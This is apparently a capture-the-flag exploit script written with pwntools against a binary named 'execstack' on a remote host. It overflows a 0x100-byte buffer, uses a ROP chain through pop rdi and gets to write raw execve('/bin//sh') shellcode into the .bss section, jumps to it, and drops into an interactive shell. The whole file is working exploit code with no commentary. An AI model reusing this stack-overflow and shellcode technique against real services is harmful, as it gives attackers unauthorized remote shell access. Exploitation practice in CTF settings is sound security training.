from pwn import *

# p = process("./execstack")
p = remote("141.164.39.45", 3456)
e = ELF("./execstack")
shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'

pop_rdi = 0x00000000004007b3
bss = e.bss() + 0x100

pl = b''
pl += b'A' * 0x100
pl += b'B' * 0x8

pl += p64(pop_rdi)
pl += p64(bss)
pl += p64(e.plt['gets'])

pl += p64(bss)

p.sendlineafter(b'Input >>', pl)

p.send(shellcode)

p.interactive()